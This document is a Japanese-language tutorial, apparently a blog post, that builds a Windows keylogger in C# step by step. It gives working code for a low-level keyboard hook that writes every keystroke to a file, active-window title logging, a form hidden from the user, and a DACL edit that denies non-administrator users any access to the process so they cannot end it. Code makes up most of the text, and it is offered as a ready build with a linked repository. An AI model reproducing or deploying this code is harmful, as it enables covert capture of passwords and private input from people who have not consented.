DACLの権限が変更されたWindows用キーロガー

ここでは、システム関数の呼び出しを伴う.Net C＃に基づくキーロガーの作成を検討します。システム機能自体は簡単に説明されていますが、Microsoftの公式ドキュメントを読むことをお勧めします。作業用アセンブリのあるリポジトリへのリンクとドキュメントへのリンクが最後に示されています。

実装されるもの：

  • キーボード入力のロギング。
  • アクティブなウィンドウをログに記録します。
  • 管理者権限のないユーザーからのプロセスのブロック。
  • キーボードショートカットでプロセスを停止します。

書くには、C＃、Win APIとWindows DACLの知識が必要です。

したがって、必要となるいくつかのタイプのシステムコードを分析します。各タイプは個別のEnumに格納されます。

フックのタイプ。

キーボードに関連するすべてのイベントをキャッチするには、WH_KEYBOARD_LLタイプが必要です。他のすべてのタイプのフックには、別のWH_MOUSE_LLフック（マウス関連のイベント）を除いて、別個のDLLの実装が必要です。

キーボードに関連付けられたイベントのタイプ、キーの押し下げ。

public enum KeyboardEventTypes
{
	WM_KEYDOWN = 0x0100,
	WM_KEYUP = 0x0101,
}

キー-WM_KEYUPを離して入力文字を記録します。

これとは別に、あるアプリケーションウィンドウから別のアプリケーションウィンドウへのユーザーの遷移をキャッチするためのタイプ。

public class WinEventTypes
{
	public const uint WINEVENT_OUTOFCONTEXT = 0;
	public const uint EVENT_SYSTEM_FOREGROUND = 3;
}

すべてのポイントを実装するには、最初にフォームを作成し、ユーザーから非表示にします。基本的なSetVisibleCoreメソッドをオーバーライドするだけで十分です。

protected override void SetVisibleCore(bool value)
{
	base.SetVisibleCore(false);
}

プログラムの開始時にフォームが起動します。

Application.Run(HiddenForm);

フォームがあり、キーボードの入力をインターセプトするというメイン機能を追加する必要があります。Win API SetWindowsHookExメソッドを使用して、次のパラメーターが渡されます。

  • フックのタイプはWH_KEYBOARD_LLです。
  • コールバック関数、つまり キーボードに関連するすべてのイベントを処理するメソッド。
  • 現在のモジュールのID。
  • スレッドIDは0です。フックはすべてのスレッドに関連付けられるようにゼロです。

internal IntPtr SetHook(HookTypes typeOfHook, HookProc callBack)
{
	using (Process currentProcess = Process.GetCurrentProcess())
	using (ProcessModule currentModule = currentProcess.MainModule)
	{			
		return SetWindowsHookEx((int)typeOfHook, callBack,
			 GetModuleHandle(currentModule.ModuleName), 0);
	}
}

フックを処理するメソッド自体。これにはいくつかのパラメーターがあります。nCode-現在のイベントを処理する必要があるか、すぐに渡す必要があるかを理解するために、
wParam-イベントのタイプ（キーを押すまたは離す）、lParam-現在押されている文字。本質的に、lParamはバイトの配列であるため、追加情報が格納されます。たとえば、ユーザーがキーを保持していて処理が実行されるマシンの速度が遅い場合の文字数などです。

internal static IntPtr KeyLoggerHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
{
	if (nCode >= 0 && wParam == (IntPtr)KeyboardEventTypes.WM_KEYUP)
	{
		int vkCode = Marshal.ReadInt32(lParam);
		SetKeysState();
		var saveText = GetSymbol((uint)vkCode);
		File.AppendAllText(_fileName, saveText);
	}
	return CallNextHookEx(HookId, nCode, wParam, lParam);
}

この実装は、ユーザーがキーを離した後にのみ文字を書き込みます。文字数を記録するには、タイプWM_KEYDOWNのケースを実装する必要があります。

SetKeysStateメソッドは、ケースに影響を与えるキーなど、追加のキーの状態を知るために使用されます。

private static void SetKeysState()
{
	_capsLock = GetKeyState((int)Keys.CapsLock) != 0;
	_numLock = GetKeyState((int)Keys.NumLock) != 0;
	_scrollLock = GetKeyState((int)Keys.Scroll) != 0;
	_shift = GetKeyState((int)Keys.ShiftKey) != 0;
}

GetKeyStateは、キーコードによってステータスを確認できる別のWin APIメソッドです。

private static string GetSymbol(uint vkCode)
{
	var buff = new StringBuilder(maxChars);
	var keyboardState = new byte[maxChars];
	var keyboard = GetKeyboardLayout(
					GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
	ToUnicodeEx(vkCode, 0, keyboardState, buff, maxChars, 0, (IntPtr)keyboard);
	var buffSymbol = buff.ToString();
	var symbol = buffSymbol.Equals("\r") 
		? Environment.NewLine 
		: buffSymbol;
	if (_capsLock ^ _shift)
		symbol = symbol.ToUpperInvariant();
	return symbol;
}

GetSymbol メソッドでは、現在のウィンドウのGetKeyboardLayoutキーボードレイアウトコードが最初に要求され、次にToUnicodeExが両方のWin APIメソッドで文字を取得します。大文字と小文字を区別するキーが関係する場合、文字を大文字に変換する必要があります。

これで、キーボード入力をログに記録できます。ただし、現在アクティブなウィンドウを記録するには、別のフックを使用する必要があります。

internal IntPtr SetWinHook(WinEventProc callBack)
{
	using (Process currentProcess = Process.GetCurrentProcess())
	using (ProcessModule currentModule = currentProcess.MainModule)
	{
		return SetWinEventHook(
			WinEventTypes.EVENT_SYSTEM_FOREGROUND, 
			WinEventTypes.EVENT_SYSTEM_FOREGROUND, 
			GetModuleHandle(currentModule.ModuleName), 
			callBack, 0, 0, WinEventTypes.WINEVENT_OUTOFCONTEXT);
	}			
}

タイプEVENT_SYSTEM_FOREGROUNDは、アクティブウィンドウでの変更を追跡するために必要です。そしてWINEVENT_OUTOFCONTEXTは、コールバックメソッドは、我々のアプリケーションであることを示しています。

フックチェーンに渡されるメソッドには、より詳細な実装に役立つ多くのパラメーターが含まれています。この場合、アクティブなウィンドウとそのタイトルを見つけるだけで十分です。

internal static void ActiveWindowsHook(
			IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
{
		File.AppendAllText(_fileName, $"{Environment.NewLine}{GetActiveWindowTitle()}{Environment.NewLine}");
}

つまり、各ウィンドウ変更イベントが記録されます。そして、中にGetActiveWindowTitleそれはだ勝利APIのカップル使用するのに十分GetForegroundWindowの方法を使用してタイトルを要求した後、現在アクティブなウィンドウの識別子を見つける- GetWindowTextを。

private static string GetActiveWindowTitle()
{
	var buff = new StringBuilder(maxChars);
	var handle = GetForegroundWindow();

	if (GetWindowText(handle, buff, maxChars) > 0)
	{
		return buff.ToString();
	}
	return null;
}

この時点まで、すべてのシステム関数呼び出しはUser32およびKernel32ライブラリから取得されていました。次のステップは、advapi32ライブラリを使用することです。

3番目のステップは、平均的なユーザーがキーボード入力を記録するプロセスを完了できないようにすることです。最初にこのプロセスのハンドルを取得し、次にDACLにエントリを追加して変更する必要があります。

internal void BlockForNotAdminUsers()
{
	var hProcess = Process.GetCurrentProcess().Handle;
	var securityDescriptor = GetProcessSecurityDescriptor(hProcess);
	var sid = WindowsIdentity.GetCurrent().User.AccountDomainSid;

	securityDescriptor.DiscretionaryAcl.InsertAce(
			0,
			new CommonAce(
				AceFlags.None,
				AceQualifier.AccessDenied,
				(int)ProcessAccessRights.PROCESS_ALL_ACCESS,
				new SecurityIdentifier(WellKnownSidType.WorldSid, sid),
				false,
				null));

	SetProcessSecurityDescriptor(hProcess, securityDescriptor);
}

プロセス記述子はGetKernelObjectSecurityを通じて受信され、メソッドは2回呼び出されます。最初に記述子の長さを取得し、2番目の呼び出しで直接プロセス記述子を取得します。

private RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
{
	var psd = new byte[0];
	GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, out uint bufSizeNeeded);
	if (bufSizeNeeded < 0 || bufSizeNeeded > short.MaxValue)
		throw new Win32Exception();
	if (!GetKernelObjectSecurity(
			processHandle,
			DACL_SECURITY_INFORMATION,
			psd = new byte[bufSizeNeeded],
			bufSizeNeeded,
			out bufSizeNeeded))
		throw new Win32Exception();
	return new RawSecurityDescriptor(psd, 0);
}

記述子を変更した後、この情報を現在のプロセスに入力する必要があります。プロセスの識別子と記述子をシステムメソッドSetKernelObjectSecurityに渡すだけで十分です。

private void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor securityDescriptor)
{			
	var rawsd = new byte[securityDescriptor.BinaryLength];
	securityDescriptor.GetBinaryForm(rawsd, 0);
	if (!SetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, rawsd))
		throw new Win32Exception();
}

最後のステップは、キーの組み合わせを使用してプロセスを停止することです。 

internal static int SetHotKey(Keys key, IntPtr handle)
{
	int modifiers = 0;
	if ((key & Keys.Alt) == Keys.Alt)
		modifiers |= (int)CombineKeys.MOD_ALT;
	if ((key & Keys.Control) == Keys.Control)
		modifiers |= (int)CombineKeys.MOD_CONTROL;
	if ((key & Keys.Shift) == Keys.Shift)
		modifiers |= (int)CombineKeys.MOD_SHIFT;
	Keys keys = key & ~Keys.Control & ~Keys.Shift & ~Keys.Alt;
	var keyId = key.GetHashCode();
	RegisterHotKey(handle, keyId, modifiers, (int)keys);
	return keyId;			
}

ここで、keyはキーボードショートカットで、handleは非表示のフォームの識別子です。フォーム上のキーの組み合わせを認識するために、keyIdが作成されます。これにより、キーの組み合わせの動作を確認できます。そして、これらすべては、Win APIメソッドRegisterHotKeyを通じて記録されます。

最後にプロセスを停止するために、フォームでWndProcメソッドを再定義します。

protected override void WndProc(ref Message m)
{
	if (m.Msg == (int)CombineKeys.WM_HOTKEY)
	{
		if ((int)m.WParam == KeyId)
		{
			UnregisterHotKey(Handle, KeyId);
			Application.Exit();
		}
	}
	base.WndProc(ref m);
}
